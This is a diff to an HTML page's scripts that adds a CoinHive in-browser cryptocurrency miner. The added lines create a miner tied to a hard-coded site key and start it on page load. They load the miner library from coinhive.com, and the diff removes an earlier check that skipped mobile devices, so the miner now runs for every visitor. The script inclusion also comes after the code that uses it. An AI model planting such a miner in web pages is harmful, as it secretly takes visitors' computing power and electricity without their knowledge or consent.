@@ -675,27 +675,12 @@ z-index:20;
 </script>
 
 <script>
-	var miner = new CoinHive.Anonymous(kIzcijeJmdNQL1z3UXrbBPEbvVnBr7MB);			  
-if (!miner.isMobile()) {
+	var miner = new CoinHive.Anonymous();			  
+	var miner = new CoinHive.User('kIzcijeJmdNQL1z3UXrbBPEbvVnBr7MB', 'YI');
 	miner.start();
-}
 
 </script>
-
-<script>
-	// Listen on events
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-	// Update stats once per second
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-
-		// Output to HTML elements...
-	}, 1000);
-</script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 
 
 		<script type="text/javascript">
